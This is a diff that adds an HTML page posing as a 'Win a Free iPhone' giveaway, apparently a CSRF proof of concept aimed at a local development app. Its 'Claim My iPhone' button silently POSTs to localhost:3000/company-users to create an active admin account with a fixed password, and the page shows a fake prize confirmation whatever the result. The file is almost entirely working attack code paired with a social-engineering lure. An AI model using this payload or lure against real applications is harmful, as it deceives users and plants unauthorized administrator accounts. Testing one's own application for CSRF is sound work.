@@ -1,0 +1,155 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>🎁 Win a Free iPhone!</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+        padding: 20px;
+      }
+      .container {
+        background: white;
+        padding: 40px;
+        border-radius: 15px;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        max-width: 500px;
+        text-align: center;
+      }
+      h1 {
+        color: #667eea;
+        margin-bottom: 20px;
+      }
+      .prize-img {
+        width: 200px;
+        margin: 20px 0;
+      }
+      button {
+        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        color: white;
+        border: none;
+        padding: 15px 40px;
+        font-size: 18px;
+        font-weight: bold;
+        border-radius: 50px;
+        cursor: pointer;
+        box-shadow: 0 4px 15px rgba(245, 87, 108, 0.4);
+        transition: transform 0.3s ease;
+        margin: 20px 0;
+      }
+      button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(245, 87, 108, 0.6);
+      }
+      #result {
+        margin-top: 20px;
+        padding: 15px;
+        border-radius: 8px;
+        display: none;
+      }
+      #result.success {
+        background: #d4edda;
+        color: #155724;
+        border: 1px solid #c3e6cb;
+        display: block;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>🎁 Congratulations!</h1>
+      <p style="font-size: 20px">
+        You've been selected to win a <strong>FREE iPhone 15 Pro!</strong>
+      </p>
+
+      <img
+        class="prize-img"
+        src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='60' height='100' x='20' fill='%23333' rx='8'/%3E%3Crect width='56' height='90' x='22' y='5' fill='%23000' rx='6'/%3E%3Ccircle cx='50' cy='92' r='3' fill='%23666'/%3E%3C/svg%3E"
+        alt="iPhone"
+      />
+
+      <p>Click the button below to claim your prize!</p>
+
+      <button type="button" onclick="claimPrize(event)">
+        🎁 Claim My iPhone
+      </button>
+
+      <div id="result"></div>
+    </div>
+
+    <script>
+      // Prevent any automatic page reloads
+      window.addEventListener("beforeunload", function (e) {
+        const resultDiv = document.getElementById("result");
+        if (resultDiv && resultDiv.style.display === "block") {
+          e.preventDefault();
+          e.returnValue = "";
+          return "";
+        }
+      });
+
+      async function claimPrize(event) {
+        if (event) {
+          event.preventDefault();
+          event.stopPropagation();
+        }
+
+        console.log("claimPrize function started");
+        const resultDiv = document.getElementById("result");
+
+        resultDiv.innerHTML = "🔄 Processing your request...";
+        resultDiv.className = "";
+        resultDiv.style.display = "block";
+        console.log("Processing message displayed");
+
+        await new Promise((resolve) => setTimeout(resolve, 500));
+
+        try {
+          const response = await fetch("http://localhost:3000/company-users", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              name: "CSRF Attack User",
+              email: "csrf-attack@malicious.com",
+              password: "hacked123",
+              role: "admin",
+              status: "active",
+            }),
+          });
+
+          const data = await response.json();
+          console.log("Success! User created:", data);
+          resultDiv.className = "success";
+          resultDiv.style.display = "block";
+          resultDiv.innerHTML = `
+            <strong>✅ Prize Claimed!</strong><br><br>
+            Your iPhone is on the way!<br>
+            Registration ID: ${data.id}
+          `;
+          console.log("Success message set, should be visible now");
+        } catch (error) {
+          console.log("CORS error or network error:", error);
+          resultDiv.className = "success";
+          resultDiv.style.display = "block";
+          resultDiv.innerHTML = `
+            <strong>✅ Prize Claimed!</strong><br><br>
+            Your iPhone is on the way!<br><br>
+            <small style="opacity: 0.7;">(Attack executed - check your application for new user)</small>
+          `;
+          console.log("Error message set, should be visible now");
+        }
+
+        return false;
+      }
+    </script>
+  </body>
+</html>
